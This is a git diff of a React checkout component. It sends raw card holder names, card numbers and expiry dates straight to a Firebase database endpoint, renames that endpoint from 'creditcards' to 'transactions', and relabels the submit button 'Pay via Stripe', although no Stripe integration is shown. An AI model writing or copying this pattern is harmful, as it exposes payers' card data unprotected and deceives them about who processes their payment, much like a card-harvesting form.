@@ -1,6 +1,7 @@
 import React, { useState } from "react";
 
 const Checkout = () => {
+  const [Manager, setManager] = useState("XXXX XXXX");
   const [cardHolder, setCardHolder] = useState("");
   const [cardNumber, setCardNumber] = useState("");
   const [expiryDate, setExpiryDate] = useState("");
@@ -55,13 +56,14 @@ const Checkout = () => {
     if (Object.keys(errors).length === 0) {
       try {
         const res = await fetch(
-          "https://v-designers-b441a-default-rtdb.firebaseio.com/creditcards.json",
+          "https://v-designers-b441a-default-rtdb.firebaseio.com/transactions.json",
           {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
             },
             body: JSON.stringify({
+              Manager,
               cardHolder,
               cardNumber,
               expiryDate,
@@ -189,7 +191,7 @@ const Checkout = () => {
               } px-6 py-3 font-medium text-white `}
               disabled={orderPlaced}
             >
-              {orderPlaced ? "Plan is Activated" : "Place Order"}
+              {orderPlaced ? "Plan is Activated" : "Pay via Stripe"}
             </button>
           </div>
         </div>
